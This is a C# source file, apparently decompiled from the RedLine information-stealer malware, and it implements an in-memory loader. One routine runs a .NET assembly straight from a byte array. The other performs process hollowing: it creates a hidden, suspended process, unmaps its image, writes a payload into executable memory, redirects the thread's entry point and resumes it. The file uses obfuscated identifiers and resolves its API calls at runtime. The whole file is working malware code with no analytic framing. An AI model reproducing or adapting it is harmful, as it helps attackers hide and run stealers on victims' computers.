using RedLine.Logic.Helpers;
using RedLine.Models.RunPE;
using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

namespace RedLine.Logic.RunPE
{
	public static class LoadExecutor
	{
		public static bool SelfExecute(byte[] array)
		{
			try
			{
				new Thread((ThreadStart)delegate
				{
					Assembly.Load(array).EntryPoint.Invoke(null, new object[1]
					{
						new string[0]
					});
				}).Start();
				return true;
			}
			catch
			{
				return false;
			}
		}

		public unsafe static bool Execute(LoadParams args)
		{
			bool isWow = false;
			PROCESS_INFORMATION lpProcesSystemNetCertPolicyValidationCallbackv = default(PROCESS_INFORMATION);
			CONTEXT cONTEXT = default(CONTEXT);
			cONTEXT.ContextFlags = 1048603u;
			CONTEXT cONTEXT2 = cONTEXT;
			IntPtr lSqlDependencyProcessDispatcherSqlConnectionContainerHashHelperU;
			IMAGE_DOS_HEADER* ptr2;
			IMAGE_NT_HEADERS* ptr3;
			fixed (byte* ptr = args.Body)
			{
				lSqlDependencyProcessDispatcherSqlConnectionContainerHashHelperU = (IntPtr)(void*)ptr;
				ptr2 = (IMAGE_DOS_HEADER*)ptr;
				ptr3 = (IMAGE_NT_HEADERS*)(ptr + ptr2->e_lfanew);
			}
			if (ptr2->e_magic != 23117 || ptr3->Signature != 17744)
			{
				return false;
			}
			if (ptr3->OptionalHeader.Magic != 267)
			{
				return false;
			}
			Buffer.SetByte(args.Body, 920, 2);
			STARTUPINFO lpStartupInfo = default(STARTUPINFO);
			lpStartupInfo.cb = Marshal.SizeOf((object)lpStartupInfo);
			lpStartupInfo.wShowWindow = 0;
			using (LibInvoker libInvoker = new LibInvoker("kernel32.dll"))
			{
				using (LibInvoker libInvoker2 = new LibInvoker("ntdll.dll"))
				{
					if (!libInvoker.CastToDelegate<NativeDelegates.CreateProcessInternalWDelegate>("CreateProcessInternalW")(0u, null, args.AppPath, IntPtr.Zero, IntPtr.Zero, bInheritHandles: false, 134217740u, IntPtr.Zero, Path.GetDirectoryName(Assembly.GetEntryAssembly().Location), ref lpStartupInfo, out lpProcesSystemNetCertPolicyValidationCallbackv, 0u))
					{
						if (lpProcesSystemNetCertPolicyValidationCallbackv.hProcess != IntPtr.Zero && libInvoker.CastToDelegate<NativeDelegates.TerminateProcessDelegate>("TerminateProcess")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
						{
							libInvoker.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess);
							libInvoker.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hThread);
						}
						return false;
					}
					libInvoker.CastToDelegate<NativeDelegates.IsWow64ProcessDelegate>("IsWow64Process")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, ref isWow);
					IntPtr intPtr = (IntPtr)(long)ptr3->OptionalHeader.ImageBase;
					libInvoker2.CastToDelegate<NativeDelegates.NtUnmapViewOfSectionDelegate>("NtUnmapViewOfSection")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, intPtr);
					if (libInvoker.CastToDelegate<NativeDelegates.VirtualAllocExDelegate>("VirtualAllocEx")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, intPtr, ptr3->OptionalHeader.SizeOfImage, 12288u, 64u) == IntPtr.Zero && libInvoker.CastToDelegate<NativeDelegates.TerminateProcessDelegate>("TerminateProcess")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
					{
						libInvoker.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess);
						libInvoker.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hThread);
						return false;
					}
					if (!libInvoker.CastToDelegate<NativeDelegates.WriteProcessMemoryDelegate>("WriteProcessMemory")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, intPtr, lSqlDependencyProcessDispatcherSqlConnectionContainerHashHelperU, ptr3->OptionalHeader.SizeOfHeaders, IntPtr.Zero) && libInvoker.CastToDelegate<NativeDelegates.TerminateProcessDelegate>("TerminateProcess")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
					{
						libInvoker.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess);
						libInvoker.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hThread);
						return false;
					}
					for (ushort num = 0; num < ptr3->FileHeader.NumberOfSections; num = (ushort)(num + 1))
					{
						IMAGE_SECTION_HEADER* ptr4 = (IMAGE_SECTION_HEADER*)(lSqlDependencyProcessDispatcherSqlConnectionContainerHashHelperU.ToInt64() + ptr2->e_lfanew + Marshal.SizeOf(typeof(IMAGE_NT_HEADERS)) + Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER)) * num);
						if (!libInvoker.CastToDelegate<NativeDelegates.WriteProcessMemoryDelegate>("WriteProcessMemory")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, (IntPtr)(intPtr.ToInt64() + ptr4->VirtualAddress), (IntPtr)(lSqlDependencyProcessDispatcherSqlConnectionContainerHashHelperU.ToInt64() + ptr4->PointerToRawData), ptr4->SizeOfRawData, IntPtr.Zero) && libInvoker.CastToDelegate<NativeDelegates.TerminateProcessDelegate>("TerminateProcess")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
						{
							libInvoker.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess);
							libInvoker.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hThread);
							return false;
						}
					}
					if (isWow)
					{
						if (!libInvoker.CastToDelegate<NativeDelegates.Wow64GetThreadContextDelegate>("Wow64GetThreadContext")(lpProcesSystemNetCertPolicyValidationCallbackv.hThread, &cONTEXT2) && libInvoker.CastToDelegate<NativeDelegates.TerminateProcessDelegate>("TerminateProcess")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
						{
							libInvoker.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess);
							libInvoker.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hThread);
							return false;
						}
					}
					else if (!libInvoker.CastToDelegate<NativeDelegates.Wow64GetThreadContextDelegate>("GetThreadContext")(lpProcesSystemNetCertPolicyValidationCallbackv.hThread, &cONTEXT2) && libInvoker.CastToDelegate<NativeDelegates.TerminateProcessDelegate>("TerminateProcess")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
					{
						libInvoker.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess);
						libInvoker.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hThread);
						return false;
					}
					IntPtr intPtr2 = Marshal.AllocHGlobal(8);
					ulong num2 = (ulong)intPtr.ToInt64();
					byte[] array = new byte[8];
					for (int i = 0; i < 8; i++)
					{
						array[i] = (byte)(num2 >> i * 8);
						if (i == 7)
						{
							Marshal.Copy(array, 0, intPtr2, 8);
						}
					}
					if (!libInvoker.CastToDelegate<NativeDelegates.WriteProcessMemoryDelegate>("WriteProcessMemory")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, (IntPtr)((long)cONTEXT2.Ebx + 8L), intPtr2, 4u, IntPtr.Zero))
					{
						Marshal.FreeHGlobal(intPtr2);
						if (libInvoker.CastToDelegate<NativeDelegates.TerminateProcessDelegate>("TerminateProcess")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
						{
							libInvoker.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess);
							libInvoker.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hThread);
							return false;
						}
					}
					Marshal.FreeHGlobal(intPtr2);
					cONTEXT2.Eax = (uint)(intPtr.ToInt64() + ptr3->OptionalHeader.AddressOfEntryPoint);
					if (isWow)
					{
						if (!libInvoker.CastToDelegate<NativeDelegates.Wow64SetThreadContextDelegate>("Wow64SetThreadContext")(lpProcesSystemNetCertPolicyValidationCallbackv.hThread, &cONTEXT2) && libInvoker.CastToDelegate<NativeDelegates.TerminateProcessDelegate>("TerminateProcess")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
						{
							libInvoker.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess);
							libInvoker.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hThread);
							return false;
						}
					}
					else if (!libInvoker.CastToDelegate<NativeDelegates.Wow64SetThreadContextDelegate>("SetThreadContext")(lpProcesSystemNetCertPolicyValidationCallbackv.hThread, &cONTEXT2) && libInvoker.CastToDelegate<NativeDelegates.TerminateProcessDelegate>("TerminateProcess")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
					{
						libInvoker.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess);
						libInvoker.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hThread);
						return false;
					}
					libInvoker.CastToDelegate<NativeDelegates.ResumeThreadDelegate>("ResumeThread")(lpProcesSystemNetCertPolicyValidationCallbackv.hThread);
					libInvoker.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess);
					libInvoker.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hThread);
				}
			}
			return true;
		}
	}
}
